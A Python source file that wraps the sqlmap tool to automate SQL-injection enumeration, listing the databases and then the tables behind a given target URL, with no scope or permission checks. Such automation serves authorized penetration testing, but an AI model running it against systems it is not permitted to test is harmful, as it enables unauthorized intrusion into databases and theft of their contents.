import subprocess

class SQLMapAutomation:
    def __init__(self, target_url):
        self.target_url = target_url

    def run_sqlmap(self, arguments):
        try:
            sqlmap_command = ['sqlmap'] + arguments
            process = subprocess.Popen(sqlmap_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            output = output.decode('utf-8')
            error = error.decode('utf-8')

            # if output:
            #     # print(output)
            if error:
                print(f"Error: {error}")

            return output
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            return None

    def list_databases(self):
        arguments = ['-u', self.target_url, '--dbs', '--batch']
        output = self.run_sqlmap(arguments)
        databases = []

        for line in output.splitlines():
            line = line.strip()
            if line.startswith('[*]'):
                db_name = line.split('[*]')[1].strip()
                databases.append(db_name)

        databases = [db for db in databases if not (db.startswith('starting @') or db.startswith('ending @'))]

        if 'information_schema' in databases:
            databases.remove('information_schema')

        return databases
    def list_tables(self, database_name):
        arguments = ['-u', self.target_url, '-D', database_name, '--tables', '--batch']
        output = self.run_sqlmap(arguments)
        tables = []

        for line in output.splitlines():
            if line.startswith('|') and '|' in line:
                table_name = line.split('|')[1].strip()
                tables.append(table_name)

        return tables

    def run(self):
        databases = self.list_databases()
        if not databases:
            print("No databases found.")
            return

        print(f"[*] Databases found: {databases}")

        for database in databases:
            tables = self.list_tables(database)
            if not tables:
                print(f"No tables found for database {database}.")
                continue

            print(f"[*] Tables found in database {database}: {tables}")